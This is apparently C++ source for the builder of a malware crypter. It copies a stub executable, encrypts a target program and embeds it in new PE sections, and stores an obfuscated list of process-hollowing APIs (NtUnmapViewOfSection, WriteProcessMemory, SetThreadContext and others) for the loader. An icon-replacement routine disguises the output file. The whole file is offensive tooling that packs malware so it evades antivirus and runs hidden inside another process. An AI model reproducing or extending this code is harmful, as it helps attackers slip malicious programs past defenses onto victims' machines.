#include "StdAfx.h"
#include "BuildWorker.h"
#include <iostream>
#include <fstream>

BuildWorker::BuildWorker(PCHAR savepath, PCHAR stubpath, PCHAR pepath)
{
	m_SavePath = savepath;
	m_StubPath = stubpath;
	m_PePath = pepath;
	crypto = new CryptoStuff();
}


BuildWorker::~BuildWorker()
{


}


void BuildWorker::xEncryptFile()
{

	using std::ofstream;
	using std::ios;

	if(!CopyToSavePath())
	{
		 return; 
	}

	ParsePE();
	crypto->Encrypt(m_peBuffer, m_PESize);

	HANDLE FileHandle;
	DWORD FileSize;
	HANDLE FileMap;
	ULONG_PTR FileMapVA;
	DWORD NewSec;
	DWORD LoadSec;
	DWORD OepRVA;
	DWORD ImageBase;
	DWORD OriginalEntryPoint;
	ULONG_PTR SectionWriteOffset;
	ULONG_PTR SectionWriteOffsetLoader;

	NewSec = AddNewSectionEx(m_SavePath, ".undX", m_PESize, NULL, NULL, NULL);
	LoadSec = AddNewSectionEx(m_SavePath, ".undXx", 150, NULL, NULL, NULL);
	if(NewSec != NULL)
	{
        if(StaticFileLoad(m_SavePath, UE_ACCESS_ALL, false, &FileHandle, &FileSize, &FileMap, &FileMapVA))
	    {
		    ImageBase = (DWORD)GetPE32DataFromMappedFile(FileMapVA, NULL, UE_IMAGEBASE);
		    OriginalEntryPoint = (DWORD)GetPE32DataFromMappedFile(FileMapVA, NULL, UE_OEP);


			OepRVA = ImageBase + OriginalEntryPoint;
			NewSec = NewSec + ImageBase;
			LoadSec = LoadSec + ImageBase;

			SectionWriteOffset = (ULONG_PTR)ConvertVAtoFileOffset(FileMapVA, NewSec, true);
			RtlMoveMemory((PVOID)SectionWriteOffset, (PBYTE)m_peBuffer, m_PESize);
			////////////////////////
			PCHAR ch_temp;
			PCHAR ch_tmp0;
			DWORD dwCodeSize;
					
			ch_tmp0 = "ntdll.dll<kernel32.dll<NtUnmapViewOfSection<CreateProcessA<GetThreadContext<ReadProcessMemory<WriteProcessMemory<SetThreadContext<ResumeThread<VirtualAllocEx<VirtualFree<";
			ch_tmp0 =  crypto->ByteRounder(ch_tmp0, lstrlen(ch_tmp0));
			
			SectionWriteOffsetLoader = (ULONG_PTR)ConvertVAtoFileOffset(FileMapVA, LoadSec, true);
			memcpy((PVOID)SectionWriteOffsetLoader, ch_tmp0, lstrlen(ch_tmp0));

		    SetPE32DataForMappedFile(FileMapVA, LoadSec, UE_SECTIONFLAGS, 0xE0000020);
			StaticFileUnload(m_SavePath, true, FileHandle, FileSize, FileMap, FileMapVA);		
	    }
	}		

	
	
/*

	
	hUpdate = BeginUpdateResource(SavefileName, FALSE);
	if(hUpdate == NULL)
	{
		MessageBox("Could add resource!", NULL, MB_ICONERROR);
		return;
	}

	if(UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(150), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), lpFiletoCryptBuffer, dwbyteSize) == FALSE)
	{
		MessageBox("Could add resource!", NULL, MB_ICONERROR);
		return;
	}


	if(UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(151), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), "hello", strlen("hello")) == FALSE)
	{
		MessageBox("Could add resource!", NULL, MB_ICONERROR);
		return;
	}

	


	if(EndUpdateResource(hUpdate, FALSE) == FALSE)
	{

	}
	
	*/
   



}

void BuildWorker::ParsePE()
{
	DWORD bytereaded;
	
	m_PEHandle = CreateFile(m_PePath, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, 0, NULL);
	if(m_PEHandle == INVALID_HANDLE_VALUE)
	{	
		//MessageBoxA("Stub Path error", NULL, 0);
		return;
	}
	m_PESize = GetFileSize(m_PEHandle, NULL);
	m_peBuffer = (PCHAR)malloc(m_PESize);
	ReadFile(m_PEHandle, m_peBuffer, m_PESize, & bytereaded, NULL);
	CloseHandle(m_PEHandle);
}

bool BuildWorker::CopyToSavePath()
{
	if(CopyFile(m_StubPath, m_SavePath, FALSE) == 0)
	{
		return false;
	}
	return true;
}

void BuildWorker::ChangeIcon(PCHAR iconpath)
{
	HANDLE hFile = CreateFile(iconpath, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}
	LPICONDIR lpid;
	lpid = (LPICONDIR)malloc(sizeof(ICONDIR));
	if(lpid == NULL)
	{
		return;
	}
	DWORD dwBytesRead;
	ReadFile(hFile, &lpid->idReserved, sizeof(WORD), &dwBytesRead, NULL);
	ReadFile(hFile, &lpid->idType, sizeof(WORD), &dwBytesRead, NULL);
	ReadFile(hFile, &lpid->idCount, sizeof(WORD), &dwBytesRead, NULL);
	lpid = (LPICONDIR)realloc(lpid, (sizeof(WORD) * 3) + (sizeof(ICONDIRENTRY) * lpid->idCount));
	if(lpid == NULL)
	{
		return;
	}
	ReadFile(hFile, &lpid->idEntries[0], sizeof(ICONDIRENTRY) * lpid->idCount, &dwBytesRead, NULL);
	LPGRPICONDIR lpgid;
	lpgid = (LPGRPICONDIR)malloc(sizeof(GRPICONDIR));
	if(lpgid == NULL)
	{
		return;
	}
	lpgid->idReserved = lpid->idReserved;
	lpgid->idType = lpid->idType;
	lpgid->idCount = lpid->idCount;
	lpgid = (LPGRPICONDIR)realloc(lpgid, (sizeof(WORD) * 3) + (sizeof(GRPICONDIRENTRY) * lpgid->idCount));
	if(lpgid == NULL)
	{
		return ;
	}
	for(int i = 0; i < lpgid->idCount; i++)
	{
		lpgid->idEntries[i].bWidth = lpid->idEntries[i].bWidth;
		lpgid->idEntries[i].bHeight = lpid->idEntries[i].bHeight;
		lpgid->idEntries[i].bColorCount = lpid->idEntries[i].bColorCount;
		lpgid->idEntries[i].bReserved = lpid->idEntries[i].bReserved;
		lpgid->idEntries[i].wPlanes = lpid->idEntries[i].wPlanes;
		lpgid->idEntries[i].wBitCount = lpid->idEntries[i].wBitCount;
		lpgid->idEntries[i].dwBytesInRes = lpid->idEntries[i].dwBytesInRes;
		lpgid->idEntries[i].nID = i + 1;
	}
	HANDLE hUpdate;
	hUpdate = BeginUpdateResource(m_SavePath, TRUE);
	if(hUpdate == NULL)
	{
		CloseHandle(hFile);
		return;
	}
	for(int i = 0; i < lpid->idCount; i++)
	{
		LPBYTE lpBuffer = (LPBYTE)malloc(lpid->idEntries[i].dwBytesInRes);
		if(lpBuffer == NULL)
		{
			CloseHandle(hFile);
			return;
		}
		SetFilePointer(hFile, lpid->idEntries[i].dwImageOffset, NULL, FILE_BEGIN);
		ReadFile(hFile, lpBuffer, lpid->idEntries[i].dwBytesInRes, &dwBytesRead, NULL);
		if(UpdateResource(hUpdate, RT_ICON, MAKEINTRESOURCE(lpgid->idEntries[i].nID), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), &lpBuffer[0], lpid->idEntries[i].dwBytesInRes) == FALSE)
		{
			CloseHandle(hFile);
			free(lpBuffer);
			return;
		}
		free(lpBuffer);
	}
	CloseHandle(hFile);
	if(UpdateResource(hUpdate, RT_GROUP_ICON, MAKEINTRESOURCE(1), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), &lpgid[0], (sizeof(WORD) * 3) + (sizeof(GRPICONDIRENTRY) * lpgid->idCount)) == FALSE)
	{
		return;
	}
	if(EndUpdateResource(hUpdate, FALSE) == FALSE)
	{
		return;
	}
	return;
}

